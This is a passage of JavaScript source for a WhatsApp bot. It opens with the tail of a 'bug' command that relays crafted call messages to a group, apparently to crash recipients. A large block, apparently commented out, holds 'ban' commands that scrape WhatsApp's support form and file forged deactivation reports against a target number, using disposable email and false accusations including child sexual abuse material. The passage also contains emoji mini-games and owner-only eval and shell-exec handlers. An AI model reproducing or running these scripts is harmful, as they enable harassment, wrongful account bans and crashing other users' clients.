"title": xeonybug1,
}
}), { userJid: from, quoted : m})
nyanBot2.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await nyanBot2.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
nyanBot2.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
*/

            default:
                if (budy == '🎯') {
                    let userPointsDB = readDatabase();
                    totalTiro = ["failTiro","tiro10p","tiro30p","tiro50p","tiro70p","tiroWin"]
                    tiroStickers = Math.floor(Math.random() * totalTiro.length)
                    let puntos = 0;
                    let msgTiro = 'Puntos Ganados:'
                    if (!userPointsDB[sender]) {
                        userPointsDB[sender] = 0;
                    }
                    switch (totalTiro[tiroStickers]){
                        case 'tiro10p':
                            puntos = 10;
                            break
                        case 'tiro30p':
                            puntos = 30;
                            break
                        case 'tiro50p':
                            puntos = 50;
                            break
                        case 'tiro70p':
                            puntos = 70;
                            break
                        case 'tiroWin':
                            puntos = 100;
                            msgTiro = '🎉¡Premio mayor! Puntos:'
                            break
                        default:
                            puntos = 0;
                            msgTiro = 'Has fallado el tiro! 😞'
                    }
                    userPointsDB[sender] += puntos;
                    saveDatabase(userPointsDB);
                    let amount1000 = puntos * 1000;
                    nyanBot2.sendMessage(from, { sticker: fs.readFileSync(`./Media/sticker/tiro/${totalTiro[tiroStickers]}.webp`)}, { quoted: {
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            id: `${ownername}`,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: amount1000,
                                requestFrom: '0@s.whatsapp.net',
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: msgTiro
                                    }
                                },
                                expiryTimestamp: 999999999,
                                amount: {
                                    value: 5219984907794,
                                    offset: 1000,
                                    currencyCode: "INR"
                                }
                            }
                        }
                    } })
                }
                if (budy == '🎳') {
                    let userPointsDB = readDatabase();
                    totalBolo = ["boloFail","bolo10","bolo20","bolo60","bolo80","boloWin"]
                    boloStickers = Math.floor(Math.random() * totalBolo.length)
                    let puntos = 0;
                    let msgBolo = 'Puntos Ganados:'
                    if (!userPointsDB[sender]) {
                        userPointsDB[sender] = 0;
                    }
                    switch (totalBolo[boloStickers]){
                        case 'bolo10':
                            puntos = 10;
                            break
                        case 'bolo20':
                            puntos = 20;
                            break
                        case 'bolo60':
                            puntos = 60;
                            break
                        case 'bolo80':
                            puntos = 80;
                            break
                        case 'boloWin':
                            puntos = 100;
                            msgBolo = '🎉¡Lechusa 🦉! o como era?🤔 Puntos:'
                            break
                        default:
                            puntos = 0;
                            msgBolo = 'Has fallado el tiro! 😞'
                    }
                    userPointsDB[sender] += puntos;
                    saveDatabase(userPointsDB);
                    let amount1000 = puntos * 1000;
                    nyanBot2.sendMessage(from, { sticker: fs.readFileSync(`./Media/sticker/bolo/${totalBolo[boloStickers]}.webp`)}, { quoted: {
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            id: `${ownername}`,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: amount1000,
                                requestFrom: '0@s.whatsapp.net',
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: msgBolo
                                    }
                                },
                                expiryTimestamp: 999999999,
                                amount: {
                                    value: 5219984907794,
                                    offset: 1000,
                                    currencyCode: "INR"
                                }
                            }
                        }
                    } })
                }
                if (budy == '⚽') {
                    let userPointsDB = readDatabase();
                    footTiro = ["footFail", "footPoste", "foot50", "foot75", "foot100"]
                    footStickers = Math.floor(Math.random() * footTiro.length)
                    let puntos = 0;
                    let msgFoot = 'Puntos Ganados:'
                    if (!userPointsDB[sender]) {
                        userPointsDB[sender] = 0;
                    }
                    switch (footTiro[footStickers]){
                        case 'footPoste':
                            puntos = 0;
                            msgFoot = 'Poste carnal! 🫣 0 puntos!'
                            break
                        case 'foot50':
                            puntos = 50;
                            break
                        case 'foot75':
                            puntos = 75;
                            break
                        case 'foot100':
                            puntos = 100;
                            msgTiro = '🎉¡Premio mayor! Puntos:'
                            break
                        default:
                            puntos = 0;
                            msgFoot = 'Uff! te la volaste pai 😞 0 puntos!'
                    }
                    userPointsDB[sender] += puntos;
                    saveDatabase(userPointsDB);
                    let amount1000 = puntos * 1000;
                    nyanBot2.sendMessage(from, { sticker: fs.readFileSync(`./Media/sticker/foot/${footTiro[footStickers]}.webp`)}, { quoted: {
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            id: `${ownername}`,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: amount1000,
                                requestFrom: '0@s.whatsapp.net',
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: msgFoot
                                    }
                                },
                                expiryTimestamp: 999999999,
                                amount: {
                                    value: 5219984907794,
                                    offset: 1000,
                                    currencyCode: "INR"
                                }
                            }
                        }
                    } })
                }
                if (budy == '🏀') {
                    let userPointsDB = readDatabase();
                    baskTiro = ["baskFail", "baskFail2", "baskFail3", "bask50", "bask100"]
                    baskStickers = Math.floor(Math.random() * baskTiro.length)
                    let puntos = 0;
                    let msgbask = 'Puntos Ganados:'
                    if (!userPointsDB[sender]) {
                        userPointsDB[sender] = 0;
                    }
                    switch (baskTiro[baskStickers]){
                        case 'baskFail':
                            puntos = 0;
                            msgbask = 'Uff! Casi 😬 0 puntos!'
                            break
                        case 'baskFail2':
                            puntos = 0;
                            msgbask = 'Casiiii! 🤯 0 puntos!'
                            break
                        case 'baskFail3':
                            puntos = 0;
                            msgbask = 'Y ahora como lo bajamos de ahi!😑 0 puntos!'
                            break
                        case 'bask50':
                            puntos = 50;
                            msgbask = 'Bien! Ganaste:'
                            break
                        case 'bask100':
                            puntos = 100;
                            msgbask = '🎉¡Excelente tiro! 🏀 Puntos:'
                            break
                    }
                    userPointsDB[sender] += puntos;
                    saveDatabase(userPointsDB);
                    let amount1000 = puntos * 1000;
                    nyanBot2.sendMessage(from, { sticker: fs.readFileSync(`./Media/sticker/bask/${baskTiro[baskStickers]}.webp`)}, { quoted: {
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            id: `${ownername}`,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: amount1000,
                                requestFrom: '0@s.whatsapp.net',
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: msgbask
                                    }
                                },
                                expiryTimestamp: 999999999,
                                amount: {
                                    value: 5219984907794,
                                    offset: 1000,
                                    currencyCode: "INR"
                                }
                            }
                        }
                    } })
                }
                if (budy == '🎲') {
                    let userPointsDB = readDatabase();
                    dadoTiro = ["dado1", "dado2", "dado3", "dado4", "dado5", "dado6"]
                    dadoStickers = Math.floor(Math.random() * dadoTiro.length)
                    let puntos = 0;
                    let msgDado = 'Puntos Ganados:'
                    if (!userPointsDB[sender]) {
                        userPointsDB[sender] = 0;
                    }
                    switch (dadoTiro[dadoStickers]){
                        case 'dado1':
                            puntos = 10;
                            msgDado = 'Dado #1! Ganaste:'
                            break
                        case 'dado2':
                            puntos = 20;
                            msgDado = 'Dado #2! Ganaste:'
                            break
                        case 'dado3':
                            puntos = 30;
                            msgDado = 'Dado #3! Ganaste:'
                            break
                        case 'dado4':
                            puntos = 40;
                            msgDado = 'Dado #4! Ganaste:'
                            break
                        case 'dado5':
                            puntos = 50;
                            msgDado = 'Dado #5! Ganaste:'
                            break
                        case 'dado6':
                            puntos = 60;
                            msgDado = 'Dado #6! Ganaste:'
                            break
                    }
                    userPointsDB[sender] += puntos;
                    saveDatabase(userPointsDB);
                    let amount1000 = puntos * 1000;
                    nyanBot2.sendMessage(from, { sticker: fs.readFileSync(`./Media/sticker/dado/${dadoTiro[dadoStickers]}.webp`)}, { quoted: {
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            id: `${ownername}`,
                            participant: '0@s.whatsapp.net'
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: amount1000,
                                requestFrom: '0@s.whatsapp.net',
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: msgDado
                                    }
                                },
                                expiryTimestamp: 999999999,
                                amount: {
                                    value: 5219984907794,
                                    offset: 1000,
                                    currencyCode: "INR"
                                }
                            }
                        }
                    } })
                }
                if (budy.startsWith('=>')) {
                    if (!isSamu) return
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isSamu) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isSamu) return StickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
nyanBot2.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
nyanBot2.sendMessage("5219984907794@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
